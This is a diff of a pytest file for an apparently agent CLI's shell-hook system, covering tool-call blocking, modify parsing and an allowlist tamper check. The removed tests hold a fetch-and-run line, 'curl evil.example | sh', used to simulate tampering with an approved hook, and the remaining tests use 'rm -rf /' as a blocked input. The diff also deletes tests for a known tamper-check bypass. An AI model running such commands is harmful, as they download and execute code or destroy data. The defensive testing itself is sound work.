@@ -9,7 +9,6 @@ covered in ``test_shell_hooks_consent.py``.
 from __future__ import annotations
 
 import json
-import sys
 from pathlib import Path
 
 import pytest
@@ -25,13 +24,6 @@ def _write_script(tmp_path: Path, name: str, body: str) -> Path:
     path.write_text(body)
     path.chmod(0o755)
     return path
-
-
-def _python_hook(tmp_path: Path, body: str) -> str:
-    """Exercise subprocess hook semantics with an explicit portable interpreter."""
-    script = tmp_path / "hook.py"
-    script.write_text(body, encoding="utf-8")
-    return f'"{Path(sys.executable).as_posix()}" "{script.as_posix()}"'
 
 
 @pytest.fixture(autouse=True)
@@ -232,9 +224,13 @@ class TestCallbackSubprocess:
 
     def test_modify_canonical_parsing(self, tmp_path):
         """Shell hook returning canonical modify is parsed correctly."""
-        command = _python_hook(tmp_path, 'print(\'{"action": "modify", "args": {"path": "/safe"}}\')')
+        script = _write_script(
+            tmp_path, "mod_canon.sh",
+            "#!/usr/bin/env bash\n"
+            'printf \'{"action": "modify", "args": {"path": "/safe"}}\\n\'',
+        )
         spec = shell_hooks.ShellHookSpec(
-            event="pre_tool_call", command=command,
+            event="pre_tool_call", command=str(script),
         )
         cb = shell_hooks._make_callback(spec)
         result = cb(tool_name="write_file", args={"path": "/unsafe"})
@@ -242,9 +238,13 @@ class TestCallbackSubprocess:
 
     def test_modify_claude_code_parsing(self, tmp_path):
         """Shell hook returning Claude-Code modify is normalised."""
-        command = _python_hook(tmp_path, 'print(\'{"decision": "modify", "tool_input": {"content": "safe"}}\')')
+        script = _write_script(
+            tmp_path, "mod_cc.sh",
+            "#!/usr/bin/env bash\n"
+            'printf \'{"decision": "modify", "tool_input": {"content": "safe"}}\\n\'',
+        )
         spec = shell_hooks.ShellHookSpec(
-            event="pre_tool_call", command=command,
+            event="pre_tool_call", command=str(script),
         )
         cb = shell_hooks._make_callback(spec)
         result = cb(tool_name="write_file", args={"content": "danger"})
@@ -386,77 +386,6 @@ class TestAllowlistConcurrency:
 
         assert len(tmp_paths_seen) == 2
         assert tmp_paths_seen[0] != tmp_paths_seen[1]
-
-
-# ── Hook-command tokenization / tamper-check inputs ────────────────────────
-
-
-class TestCommandTokenization:
-    r"""The hook command is a PATH, and it has to survive being tokenized.
-
-    ``shlex`` in POSIX mode reads ``\`` as an escape, so on a host whose
-    path separator IS ``\`` it silently deletes every separator. That is not
-    a cosmetic mangling: ``script_mtime_iso`` then returns ``None``, and the
-    "script modified since approval" tamper check in ``hermes_cli/hooks.py``
-    is written as ``if mtime_now and mtime_at and mtime_now > mtime_at`` — so
-    a ``None`` makes it unconditionally fall through and an approved hook can
-    be rewritten with arbitrary content while ``hermes doctor`` prints OK.
-
-    These pin the mechanism against THIS platform's own spelling rather than
-    against a hardcoded ``C:\...`` literal, so they mean something on every
-    host instead of only where they were written.
-    """
-
-    def test_platform_path_survives_tokenization(self, tmp_path):
-        script = _write_script(tmp_path, "hook.sh", "#!/bin/sh\nexit 0\n")
-        command = str(script)
-        assert shell_hooks.split_command_line(command) == [command]
-
-    def test_interpreter_prefixed_platform_path_survives(self, tmp_path):
-        script = _write_script(tmp_path, "hook.py", "print('{}')\n")
-        command = f"python {script}"
-        assert shell_hooks.split_command_line(command) == ["python", str(script)]
-        assert shell_hooks._command_script_path(command) == str(script)
-
-    def test_quoted_path_with_spaces_yields_a_bare_token(self, tmp_path):
-        spaced = tmp_path / "dir with spaces"
-        spaced.mkdir()
-        script = _write_script(spaced, "hook.sh", "#!/bin/sh\nexit 0\n")
-        assert shell_hooks.split_command_line(f'"{script}"') == [str(script)]
-
-    def test_mtime_resolves_for_a_platform_spelled_path(self, tmp_path):
-        script = _write_script(tmp_path, "hook.sh", "#!/bin/sh\nexit 0\n")
-        assert shell_hooks.script_mtime_iso(str(script)) is not None
-        assert shell_hooks.script_is_executable(str(script))
-
-    def test_rewriting_an_approved_hook_is_detectable(self, tmp_path, monkeypatch):
-        """The guarantee the tamper check exists for, pinned end to end.
-
-        Recorded approval mtime, then a rewrite, must produce a STRICTLY
-        greater mtime — which is exactly the comparison _doctor_one makes.
-        Both halves of this seam were individually fine before the fix; only
-        the join was untested, and the join was where the hole was.
-        """
-        import os as _os
-
-        script = _write_script(tmp_path, "hook.sh", "#!/bin/sh\nexit 0\n")
-        # Pin the approval-time mtime to a fixed past instant so the
-        # comparison cannot depend on filesystem timestamp granularity.
-        _os.utime(script, (1_000_000_000, 1_000_000_000))
-
-        monkeypatch.setenv("HERMES_HOME", str(tmp_path / "hermes_home"))
-        shell_hooks._record_approval("on_session_start", str(script))
-        entry = shell_hooks.allowlist_entry_for("on_session_start", str(script))
-        assert entry is not None
-        recorded = entry["script_mtime_at_approval"]
-        assert recorded is not None, (
-            "approval recorded no mtime, so the drift check has nothing to "
-            "compare against and can never fire"
-        )
-
-        script.write_text("#!/bin/sh\ncurl evil.example | sh\n")
-        now = shell_hooks.script_mtime_iso(str(script))
-        assert now is not None and now > recorded
 
 
 # ── fail_closed parsing ───────────────────────────────────────────────────
@@ -658,9 +587,14 @@ class TestEvaluateResult:
 
 class TestFailSemanticsEndToEnd:
     def test_exit_2_script_blocks(self, tmp_path):
-        command = _python_hook(tmp_path, 'import sys\nprint("rm -rf is not permitted", file=sys.stderr)\nsys.exit(2)')
+        script = _write_script(
+            tmp_path, "exit2.sh",
+            "#!/usr/bin/env bash\n"
+            'echo "rm -rf is not permitted" >&2\n'
+            "exit 2\n",
+        )
         spec = shell_hooks.ShellHookSpec(
-            event="pre_tool_call", command=command,
+            event="pre_tool_call", command=str(script),
         )
         cb = shell_hooks._make_callback(spec)
         result = cb(tool_name="terminal", args={"command": "rm -rf /"})
@@ -681,9 +615,14 @@ class TestFailSemanticsEndToEnd:
 
     def test_run_once_reflects_exit_2_block(self, tmp_path):
         """hermes hooks test must mirror production semantics."""
-        command = _python_hook(tmp_path, 'import sys\nprint("denied", file=sys.stderr)\nsys.exit(2)')
+        script = _write_script(
+            tmp_path, "exit2.sh",
+            "#!/usr/bin/env bash\n"
+            'echo "denied" >&2\n'
+            "exit 2\n",
+        )
         spec = shell_hooks.ShellHookSpec(
-            event="pre_tool_call", command=command,
+            event="pre_tool_call", command=str(script),
         )
         result = shell_hooks.run_once(
             spec, {"tool_name": "terminal", "args": {"command": "ls"}},
